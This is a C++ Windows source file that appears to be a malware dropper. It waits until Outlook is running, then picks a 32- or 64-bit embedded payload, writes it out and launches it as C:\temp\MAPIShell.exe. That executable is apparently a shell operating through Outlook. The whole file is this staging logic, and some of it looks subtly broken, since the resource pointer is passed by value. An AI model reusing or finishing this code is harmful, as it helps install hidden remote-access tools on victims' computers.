#include "Utility.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	DWORD dwProcessId;
	do {
		dwProcessId = GetProcessID("OUTLOOK.EXE");
		Sleep(5000);
	} while (dwProcessId == -1);

	BOOL ret;
	BOOL x32;
	BOOL x64Windows = IsWin64bit();
	LPVOID lpResourceData = NULL;
	DWORD dwSizeofResource;

	if (x64Windows) {
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);
		if (hProcess == NULL)
			return FALSE;

		ret = IsWow64Process(hProcess, &x32);
		if (ret == NULL)
		{
			CloseHandle(hProcess);
			return FALSE;
		}

		CloseHandle(hProcess);

		if (x32)
		{
			dwSizeofResource = GetResource(101, lpResourceData);
			if (dwSizeofResource == -1)
				return FALSE;
		}
		else
		{
			dwSizeofResource = GetResource(102, lpResourceData);
			if (dwSizeofResource == -1)
				return FALSE;
		}
	}
	else {
		dwSizeofResource = GetResource(101, lpResourceData);
		if (dwSizeofResource == -1)
			return FALSE;
	}

	ret = DeployResource(lpResourceData, dwSizeofResource);
	if (ret == FALSE)
		return FALSE;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (CreateProcess(_T("C:\\temp\\MAPIShell.exe"), NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	return TRUE;
}